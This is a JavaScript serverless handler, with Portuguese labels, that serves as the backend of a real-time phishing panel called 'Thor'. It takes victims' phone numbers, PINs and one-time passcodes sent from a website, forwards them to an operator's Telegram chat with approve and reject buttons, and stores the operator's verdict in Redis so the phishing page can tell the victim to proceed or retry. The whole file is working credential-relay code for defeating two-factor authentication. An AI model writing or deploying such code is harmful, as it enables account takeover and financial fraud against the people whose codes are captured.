import { Redis } from '@upstash/redis';

const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

export default async function handler(req, res) {
    const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    if (!TELEGRAM_TOKEN || !CHAT_ID) {
        return res.status(500).json({ error: "Missing Telegram Env Vars" });
    }

    if (req.method === 'GET') {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
        res.setHeader('Pragma', 'no-cache');
        
        const { userId, type } = req.query;
        const key = `status_${userId}_${type}`;
        
        try {
            const status = await redis.get(key) || 'pending';
            if (status !== 'pending') {
                await redis.del(key);
            }
            return res.status(200).json({ status: status });
        } catch (error) {
            console.error("[REDIS GET ERROR]", error);
            return res.status(200).json({ status: 'pending' }); 
        }
    }

    if (req.method === 'POST') {
        try {
            const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;

            // A. BOTÃO DO TELEGRAM CLICADO
            if (body.callback_query) {
                const callback = body.callback_query;
                const data = callback.data; 
                
                const parts = data.split('_');
                const action = parts[0]; 
                const userId = parts[parts.length - 1]; 
                const type = parts.slice(1, parts.length - 1).join('_'); 

                const key = `status_${userId}_${type}`;
                const newStatus = action === 'approve' ? 'approved' : 'rejected';
                
                try {
                    await redis.set(key, newStatus, { ex: 600 });
                    console.log(`[REDIS SET] Key: ${key} | Status: ${newStatus}`);
                } catch (redisError) {
                    console.error("[REDIS SET ERROR]", redisError);
                }

                let statusText = action === 'approve' 
                    ? `\n\n✅ <b>APROVADO</b> - O utilizador pode prosseguir` 
                    : `\n\n❌ <b>REJEITADO</b> - O utilizador deve tentar novamente`;

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: callback.message.chat.id,
                        message_id: callback.message.message_id,
                        text: callback.message.text + statusText,
                        parse_mode: 'HTML'
                    })
                });

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: callback.id })
                });

                return res.status(200).send('OK');
            }

            // B. WEBSITE A ENVIAR DADOS
            if (body.action === 'send') {
                const { type, userId, data } = body;
                const time = new Date().toLocaleString('pt-PT');
                
                try {
                    await redis.set(`status_${userId}_${type}`, 'pending', { ex: 600 });
                    console.log(`[REDIS SET] Key: status_${userId}_${type} | Status: pending`);
                } catch (redisError) {
                    console.error("[REDIS SET PENDING ERROR]", redisError);
                }
                
                let message = `# Thor - Verificação de ${type}\n`;
                message += `<b>VERIFICAÇÃO DE ${type} NECESSÁRIA</b>\n\n`;
                message += `<b>DADOS DO UTILIZADOR:</b>\n`;
                message += `• Número de Telemóvel: ${data.phone}\n`;
                
                if (type === 'PHONE_PIN') {
                    message += `• Código PIN: <code>${data.pin}</code>\n`;
                } else {
                    message += `• Código OTP: <code>${data.value}</code>\n`;
                }

                message += `• Username & Pass: user_${userId}\n`;
                message += `• Hora: ${time}\n`;
                message += `• Bot: user75\n\n`;
                message += `Verificar o ${type}:\n`;
                message += `• ${type === 'PHONE_PIN' ? 'Comprimento do PIN: 6 dígitos' : 'Comprimento do OTP: 6 dígitos'}\n`;
                message += `• Tempo limite: 5 minutos\n`;

                const keyboard = {
                    inline_keyboard: [
                        [{ text: `✅ Correto`, callback_data: `approve_${type}_${userId}` }],
                        [{ text: `❌ Errado`, callback_data: `reject_${type}_${userId}` }]
                    ]
                };

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: message, 
                        parse_mode: 'HTML',
                        reply_markup: keyboard
                    })
                });

                return res.status(200).json({ success: true });
            }
        } catch (error) {
            console.error("[SERVER ERROR]", error);
            return res.status(500).json({ error: error.message });
        }
    }
    return res.status(405).json({ error: 'Method not allowed' });
  }
